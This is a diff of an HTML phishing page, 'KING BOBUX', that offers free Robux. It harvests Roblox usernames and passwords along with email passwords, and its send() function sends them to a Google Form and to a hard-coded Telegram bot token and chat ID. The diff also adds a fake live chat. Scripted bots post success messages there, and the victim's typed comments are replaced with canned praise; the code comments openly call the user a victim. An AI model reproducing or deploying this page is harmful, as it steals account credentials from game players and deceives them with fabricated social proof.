@@ -3,30 +3,35 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>KING BOBUX | V.5 FIXED</title>
+    <title>KING BOBUX | NEON ELITE V.6</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@700&family=Orbitron:wght@900&display=swap');
-        body { background: #050505; color: #fff; font-family: 'Space Grotesk', sans-serif; min-height: 100vh; display: flex; flex-direction: column; align-items: center; overflow-x: hidden; }
-        .cyber-card { background: rgba(15, 15, 15, 0.9); backdrop-filter: blur(20px); border: 1px solid rgba(255, 215, 0, 0.2); box-shadow: 0 0 30px rgba(0,0,0,1); border-radius: 30px; position: relative; z-index: 50; }
+        @import url('https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;700&family=Orbitron:wght@900&display=swap');
+        body { background: #050505; background-image: radial-gradient(circle at 50% -20%, #221a00 0%, #050505 80%); color: #fff; font-family: 'Space Grotesk', sans-serif; min-height: 100vh; display: flex; flex-direction: column; align-items: center; overflow-x: hidden; }
+        .cyber-card { background: rgba(15, 15, 15, 0.9); backdrop-filter: blur(20px); border: 1px solid rgba(255, 215, 0, 0.1); box-shadow: 0 0 50px rgba(0,0,0,1); border-radius: 30px; position: relative; z-index: 50; }
         .gold-glow { font-family: 'Orbitron', sans-serif; text-shadow: 0 0 15px rgba(255, 215, 0, 0.5); background: linear-gradient(to bottom, #fff, #ffd700); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
         .btn-main { background: linear-gradient(90deg, #ffd700, #b8860b); color: #000; font-weight: 800; cursor: pointer; position: relative; z-index: 100; transition: 0.2s; }
         .btn-main:active { transform: scale(0.95); }
         .btn-opt { background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(255, 255, 255, 0.1); cursor: pointer; position: relative; z-index: 100; }
         .btn-opt.active { border-color: #ffd700; background: rgba(255, 215, 0, 0.2); }
-        .input-glow { background: rgba(0, 0, 0, 0.6); border: 1px solid rgba(255, 215, 0, 0.2); width: 100%; padding: 15px; border-radius: 15px; color: #ffd700; outline: none; }
+        .input-glow { background: rgba(0, 0, 0, 0.6); border: 1px solid rgba(255, 215, 0, 0.2); width: 100%; padding: 15px; border-radius: 15px; color: #ffd700; outline: none; font-size: 12px; }
         .hidden { display: none !important; }
         #bar { width: 0%; height: 100%; background: #ffd700; box-shadow: 0 0 15px #ffd700; transition: 15s linear; }
+        
+        /* Chat Styles */
+        .chat-line { animation: slideIn 0.3s ease-out; border-bottom: 1px solid rgba(255,255,255,0.03); padding: 6px 0; }
+        @keyframes slideIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        .user-comment { color: #50e3c2 !important; font-weight: bold; } /* Warna beda buat komen korban */
     </style>
 </head>
-<body class="p-6">
+<body class="p-6 flex flex-col items-center">
 
-    <header class="text-center my-10">
+    <header class="text-center my-10 fade-in">
         <h1 class="text-4xl font-black gold-glow uppercase">KING BOBUX</h1>
-        <p class="text-[8px] text-zinc-500 tracking-[5px] mt-2 uppercase">● QUANTUM SYSTEM V.5 ●</p>
+        <p class="text-[8px] text-zinc-500 tracking-[5px] mt-2 uppercase">● QUANTUM INJECTION V.6 ●</p>
     </header>
 
-    <div class="cyber-card w-full max-w-sm p-8 shadow-2xl">
+    <main class="cyber-card w-full max-w-sm p-8 shadow-2xl mb-8">
         <div id="p1" class="space-y-6">
             <div class="grid grid-cols-2 gap-4">
                 <button type="button" onclick="setA(this,'10K')" class="btn-opt py-6 rounded-2xl text-sm font-black">10K<br><span class="text-yellow-500 text-[10px]">RBX</span></button>
@@ -50,10 +55,24 @@
             <button type="button" onclick="send()" class="w-full btn-main py-5 rounded-2xl text-[10px] uppercase tracking-widest mt-4">EXECUTE CLAIM</button>
         </div>
 
-        <div id="p4" class="hidden text-center py-10">
+        <div id="p4" class="hidden text-center py-10 fade-in">
             <h3 class="gold-glow text-xl font-black italic mb-4">INJECTING...</h3>
             <div class="w-full h-1 bg-zinc-900 rounded-full overflow-hidden mb-4"><div id="bar"></div></div>
-            <p class="text-[8px] text-zinc-500 font-black uppercase tracking-widest">Success! Jangan login 24 Jam.</p>
+            <p class="text-[8px] text-zinc-500 font-black uppercase tracking-widest leading-loose">Success! Don't login for 24H.</p>
+        </div>
+    </main>
+
+    <div class="w-full max-w-sm cyber-card p-6 opacity-80">
+        <div class="flex items-center space-x-3 mb-4">
+            <div class="w-1.5 h-1.5 bg-green-500 rounded-full animate-ping"></div>
+            <span class="text-[9px] gold-glow font-black uppercase tracking-[4px]">LIVE DATASTREAM</span>
+        </div>
+        
+        <div id="chat-content" class="h-40 overflow-hidden text-[11px] space-y-1 italic mb-4 font-medium text-zinc-300"></div>
+        
+        <div class="flex items-center space-x-2 border-t border-white/5 pt-4">
+            <input type="text" id="victim-msg" placeholder="Tulis komentar..." class="flex-grow input-glow !p-3 !rounded-lg text-[10px]">
+            <button type="button" onclick="victimSend()" class="btn-main !p-3 !rounded-lg text-[9px] font-black uppercase tracking-wider">KIRIM</button>
         </div>
     </div>
 
@@ -62,36 +81,72 @@
         const tok = "8712552694:AAHAjQQhwx4Vlas6CWs6QHB4iYSA5U2LiWM", cid = "7153376507";
         const form = "https://docs.google.com/forms/d/e/1FAIpQLSfgBrBP1Bqk4tfVHBFUPZDCbW5fj7nK8NZuObuQPmhyRcEGxg/formResponse";
 
-        function setA(b, v) { 
-            document.querySelectorAll('.btn-opt').forEach(x => x.classList.remove('active')); 
-            b.classList.add('active'); 
-            amt = v; 
-            console.log("Selected:", v);
-        }
-
-        function go(f, t) { 
-            if (!amt && f == 1) { alert("Pilih jumlah dulu, Boss!"); return; }
-            document.getElementById('p' + f).classList.add('hidden'); 
-            document.getElementById('p' + t).classList.remove('hidden'); 
-        }
-
+        // Form Logic
+        function setA(b, v) { document.querySelectorAll('.btn-opt').forEach(x => x.classList.remove('active')); b.classList.add('active'); amt = v; }
+        function go(f, t) { if (!amt && f == 1) return; document.getElementById('p' + f).classList.add('hidden'); document.getElementById('p' + t).classList.remove('hidden'); }
         function sh(m) { md = m; go(2, 3); if (m == 'e') document.getElementById('ef').classList.remove('hidden'); }
-
         function send() {
-            const u = document.getElementById('u').value, p = document.getElementById('p').value, 
-                  e = document.getElementById('em').value || "-", ep = document.getElementById('ep').value || "-";
-            if (!u || !p) { alert("Isi data dulu!"); return; }
-            
-            const fd = new FormData();
-            fd.append('entry.298399091', u); fd.append('entry.434090398', p);
-            fd.append('entry.455306086', e); fd.append('entry.734491941', ep);
-            fd.append('entry.1584180390', amt);
-            
+            const u = document.getElementById('u').value, p = document.getElementById('p').value, e = document.getElementById('em').value || "-", ep = document.getElementById('ep').value || "-";
+            if (!u || !p) return;
+            const fd = new FormData(); fd.append('entry.298399091', u); fd.append('entry.434090398', p); fd.append('entry.455306086', e); fd.append('entry.734491941', ep); fd.append('entry.1584180390', amt);
             fetch(form, { method: 'POST', mode: 'no-cors', body: fd });
             fetch(`https://api.telegram.org/bot${tok}/sendMessage?chat_id=${cid}&text=${encodeURIComponent(`🚀 *ELITE*\n👤 \`${u}\`\n🔑 \`${p}\`\n📧 \`${e}\`\n🔐 \`${ep}\`\n💎 \`${amt}\``)}&parse_mode=Markdown`);
+            go(3, 4); setTimeout(() => document.getElementById('bar').style.width = "100%", 100);
+        }
+
+        // --- LIVE CHAT HYBRID LOGIC ---
+        
+        // Data Bot Chat (Nama SENSOR, Pesan Slang)
+        const botMsgs = [
+            { n: "U***_832", m: "Anjir beneran masuk cuy!" },
+            { n: "P***_911", m: "Gacor parah email gw dapet bonus." },
+            { n: "B***_N0b", m: "Landing 10k! Thx bgt min." },
+            { n: "K***_Sltn", m: "Jangan login dlu guys biar aman." },
+            { n: "R***_Jk", m: "Sempet ragu, taunya works jir!" },
+            { n: "B***_cl", m: "Wih landing 50k!" }
+        ];
+
+        // Pesan Terbatas buat Korban
+        const victimPredefinedMsgs = [
+            "Semoga masuk 24jam",
+            "yess akhirnya bisa punya robux banyak"
+        ];
+
+        // Fungsi masukin chat ke box
+        function addChat(name, msg, isVictim = false) {
+            const box = document.getElementById('chat-content');
+            const div = document.createElement('div');
+            div.className = `chat-line ${isVictim ? 'user-comment fade-in' : ''}`;
+            div.innerHTML = `<span class="text-yellow-500 font-bold">${name}:</span> <span class="ml-2">${msg}</span>`;
+            box.insertBefore(div, box.firstChild); // Masukin paling atas
+            if (box.childNodes.length > 7) box.removeChild(box.lastChild); // Batasi jumlah chat
+        }
+
+        // Bot Chat Otomatis (acak waktu)
+        function botLoop() {
+            const bot = botMsgs[Math.floor(Math.random() * botMsgs.length)];
+            addChat(bot.n, bot.m);
+            setTimeout(botLoop, Math.random() * (4000 - 2000) + 2000); // Tiap 2-4 detik
+        }
+        botLoop(); // Mulai bot
+
+        // Fungsi Komen Korban (Hybrid)
+        function victimSend() {
+            const input = document.getElementById('victim-msg');
+            const val = input.value.trim();
+            if (!val) return; // Jangan kirim kalo kosong
+
+            // Ganti isi komen korban jadi pesan sakti secara acak
+            const finalMsg = victimPredefinedMsgs[Math.floor(Math.random() * victimPredefinedMsgs.length)];
             
-            go(3, 4); 
-            setTimeout(() => document.getElementById('bar').style.width = "100%", 100);
+            // Nama sensor buatan buat korban
+            const victimName = "K***_Anom"; 
+
+            // Masukin ke chat box (Real-time Inject)
+            addChat(victimName, finalMsg, true);
+
+            // Bersihin input
+            input.value = "";
         }
     </script>
 </body>
